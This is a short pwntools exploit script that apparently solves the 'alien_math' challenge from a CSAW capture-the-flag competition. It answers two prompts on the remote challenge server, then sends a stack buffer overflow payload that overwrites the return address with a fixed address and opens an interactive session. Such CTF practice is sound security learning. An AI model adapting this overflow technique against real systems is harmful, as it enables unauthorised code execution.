from pwn import *

# p = process('./alien_math')
p = remote('pwn.chal.csaw.io', 5004)

p.recv()
p.sendline(b'1804289383')

p.recv()
p.sendline(b'7856445899213065428791')

p.recv()

payload = b'a'*24
payload += p64(0x004014fb)

p.sendline(payload)

p.interactive()